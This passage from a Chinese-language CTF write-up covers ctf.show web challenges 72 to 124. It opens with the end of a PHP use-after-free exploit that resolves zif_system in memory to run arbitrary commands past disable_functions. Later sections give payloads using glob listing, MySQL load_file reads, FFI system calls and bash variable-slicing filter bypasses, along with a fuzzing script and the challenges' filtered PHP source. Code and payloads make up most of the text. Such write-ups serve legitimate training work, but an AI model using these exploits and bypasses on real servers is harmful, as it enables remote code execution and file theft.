$p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec</span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"> </span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;constant&#x27; constant check</span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"> </span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;bin2hex&#x27; constant check</span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"> </span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123; # ELF header</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"> </span><br><span class="line">            if($f_name == 0x6d6574737973) &#123; # system</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line">        # str_shuffle prevents opcache string interning</span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    $n_alloc = 10; # increase this value if UAF fails</span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"> </span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"> </span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    # leaks</span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"> </span><br><span class="line">    # fake value</span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"> </span><br><span class="line">    # fake reference</span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"> </span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"> </span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    # fake closure object</span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    # pwn</span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class="line"> </span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要在burp中编码后发送</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-02175556.png"></p><h1 id="web-73-74"><a href="#web-73-74" class="headerlink" title="web 73-74"></a>web 73-74</h1><h2 id="一-分析代码-15"><a href="#一-分析代码-15" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>glob协议遍历出文件</p><h2 id="二-解题思路：-35"><a href="#二-解题思路：-35" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一：-11"><a href="#方法一：-11" class="headerlink" title="方法一："></a>方法一：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit(); //发现根目录下有flagc.txt</span><br><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><p>注：74为flagx.txt</p><h3 id="方法二：-11"><a href="#方法二：-11" class="headerlink" title="方法二："></a>方法二：</h3><p>可以利用数组遍历的方法输出根目录下的所有文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php    //前面的?&gt;用来闭合&lt;?</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);   //php使用glob遍历文件夹</span><br><span class="line">foreach($a as $f) </span><br><span class="line">&#123;</span><br><span class="line">echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125; </span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="web-75-76"><a href="#web-75-76" class="headerlink" title="web 75-76"></a>web 75-76</h1><h2 id="一-分析代码-16"><a href="#一-分析代码-16" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>这次过滤的更多了，连include也被过滤了</p><h2 id="二-解题思路：-36"><a href="#二-解题思路：-36" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-</span><br><span class="line">&gt;__toString().&#x27;&#x27;);&#125;exit(0);?&gt;</span><br></pre></td></tr></table></figure><p>读到根目录下的flag36.txt。</p><p>#通过payload扫描 flag36.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"> </span><br><span class="line">try &#123;</span><br><span class="line">    $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">        &#x27;root&#x27;);</span><br><span class="line"> </span><br><span class="line">    foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;</span><br><span class="line">        echo ($row[0]) . &quot;|&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $dbh = null;</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数据库的连接是读配置文件得到的<br> SQL语句来读文件绕过open_basedir和disable_function</p><h1 id="web-77"><a href="#web-77" class="headerlink" title="web 77"></a>web 77</h1><h2 id="一-分析代码-17"><a href="#一-分析代码-17" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>这题在题干中说到php7.4，可以想到<a href="https://php.p2hp.com/manual/zh/ffi.cdef.php">FFI</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</span><br></pre></td></tr></table></figure><p>通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag</p><h2 id="二-解题思路：-37"><a href="#二-解题思路：-37" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p> payload:</p><p><strong>第一种：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//首先是熟悉的确定flag位置和名称</span><br><span class="line">c=?&gt;&lt;?php </span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;); </span><br><span class="line">foreach($a as $f) </span><br><span class="line">&#123; </span><br><span class="line">echo($f-&gt;__toString().&#x27;  &#x27;);</span><br><span class="line">&#125; </span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br><span class="line">//FFI调用system函数</span><br><span class="line">c=</span><br><span class="line">$ffi=FFI :: cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag &gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);</span><br><span class="line">exit();</span><br></pre></td></tr></table></figure><p><strong>第二种：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">echo $f.&quot;    &quot; ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    &quot;int system(const char *command);&quot;);</span><br><span class="line"></span><br><span class="line">$ffi-&gt;system(&quot;/readflag &gt; 1.txt&quot;);</span><br><span class="line"></span><br><span class="line">exit();</span><br></pre></td></tr></table></figure><p>第二种之后要访问1.txt</p><h1 id="web-118"><a href="#web-118" class="headerlink" title="web 118"></a>web 118</h1><h2 id="一-分析代码-18"><a href="#一-分析代码-18" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p><strong>事先了解一下：</strong><br> <a href="https://blog.51cto.com/allenh/1695810">Linux 基础知识：Bash的内置变量</a><br> <a href="https://www.cnblogs.com/sparkdev/p/9934595.html#title_0">常见 Bash 内置变量介绍</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@baba:~# echo $&#123;PWD&#125;</span><br><span class="line">/root</span><br><span class="line">root@baba:~# echo $&#123;PWD:1:1&#125;   //表示从第2（1+1）个字符开始的一个字符</span><br><span class="line">r</span><br><span class="line">root@baba:~# echo $&#123;PWD:0:1&#125;   //表示从第1（0+1）个字符开始的一个字符</span><br><span class="line">/</span><br><span class="line">root@baba:~# echo $&#123;PWD:~0:1&#125;  //表示从最后一个字符开始的一个字符</span><br><span class="line">t</span><br><span class="line">root@baba:~# echo $&#123;PWD:~A&#125;    //字母代表0</span><br><span class="line">t</span><br></pre></td></tr></table></figure><h2 id="二-解题思路：-38"><a href="#二-解题思路：-38" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p><code>所以可以利用各个环境变量的最后一位来构造命令。 $&#123;PWD&#125;在这题肯定是/var/www/html，而$&#123;PATH&#125;通常是bin,那么$&#123;PWD:~A&#125;的结果就应该是’ l ‘，因为$&#123;PATH:~A&#125;的结果是’ n &#39;，那么他们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php</code></p><p>临时写的fuzz脚本，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://187ad318-8353-4d22-8adf-e39767820f98.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters+string.digits+<span class="string">&quot;$+-&#125;&#123;_&gt;&lt;:?*.~/\\ &quot;</span></span><br><span class="line"></span><br><span class="line">white_list = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;code&quot;</span> : payload</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;evil input&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        white_list += payload</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(white_list.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;空格&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扫一下，白名单为 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZ$&#125;&#123;_:?.~空格</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br></pre></td></tr></table></figure><p>具体解释：<a href="https://www.cnblogs.com/knight-errant-dr/p/16377935.html">https://www.cnblogs.com/knight-errant-dr/p/16377935.html</a></p><h1 id="web-119-120"><a href="#web-119-120" class="headerlink" title="web 119-120"></a>web 119-120</h1><h2 id="一-分析代码-19"><a href="#一-分析代码-19" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>比上题多过滤了path</p><h2 id="二-解题思路：-39"><a href="#二-解题思路：-39" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一：-12"><a href="#方法一：-12" class="headerlink" title="方法一："></a>方法一：</h3><p>可以构造出<code>/bin/base64 flag.php</code>，只需要/和4两个字符就行，其他的可以用通配符代替。<br> /很简单，pwd的第一位就是，因为这题ban了数字，所以可以用该题值必是1的<code>$&#123;#SHLVL&#125;`绕过**SHLVL** `是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。`只需要`$&#123;PWD::$&#123;SHLVL&#125;&#125;</code>，结果就是/</p><p><strong>RANDOM</strong><br> <code>此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。</code></p><p>4的问题，可以用<code>$&#123;#RANDOM&#125;`，在Linux中，`$&#123;#xxx&#125;`显示的是这个值的位数`不加#是变量的值，加了#是变量的值的长度`，例如12345的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此可以代替4. payload：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br></pre></td></tr></table></figure>### 方式二：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以构造/bin/cat flag.php,需要t和/，$&#123;HOME&#125;默认是/root，所以需要得到他的最后一个字母,容器的hostname应该是5个字母，所以$&#123;#HOSTNAME&#125;可以从第5位开始，1还是用$&#123;#SHLVL&#125;代替</span><br></pre></td></tr></table></figure>payload：`code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</code></p><p>查看源码即可得到flag</p><h1 id="web-121"><a href="#web-121" class="headerlink" title="web 121"></a>web 121</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="一-分析代码-20"><a href="#一-分析代码-20" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p><code>$#</code><br> <code>$?</code><br> 这两个的值都为0<br> 加上#代表长度就为1<br> 这题最关键的SHLVL被过滤了，可以用<code>$&#123;##&#125;或$&#123;#?&#125;`代替## 二.解题思路：` code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;?????$&#123;#RANDOM&#125; ????.???  code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???`hint中的payload` code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</code></p><p>使用的是/bin/rev读文件 把文件中每行逆序输出读取<br>用到了IFS</p><pre><code>定义字段分隔字符。默认值为：空格符、tab字符、换行字符(newline) 长度为3</code></pre><p>PWD为 /var/www/html<br>刚好第三个是r<br>可以匹配到/bin/rev</p><h1 id="web-122"><a href="#web-122" class="headerlink" title="web 122"></a>web 122</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="一-解题思路："><a href="#一-解题思路：" class="headerlink" title="一. 解题思路："></a>一. 解题思路：</h2><p>这题在上题的基础上又过滤了#和PWD，PWD的绕过很简单，用HOME就可以，而#,就要用到<code>$?</code>了</p><pre><code>$? 执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)</code></pre><p>所以在使用<code>$?</code>之前要先给错误的命令 让<code>$?</code>的值为1<br><code>$&#123;&#125;和 &lt;A可以但是题目上$&#123;&#125;这个不可以</code><br>所以用<code>&lt;A</code>后边的数字4还是用RANDOM随机数来获取</p><p>payload：</p><p><code> code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</code></p><h1 id="web-124"><a href="#web-124" class="headerlink" title="web 124"></a>web 124</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span 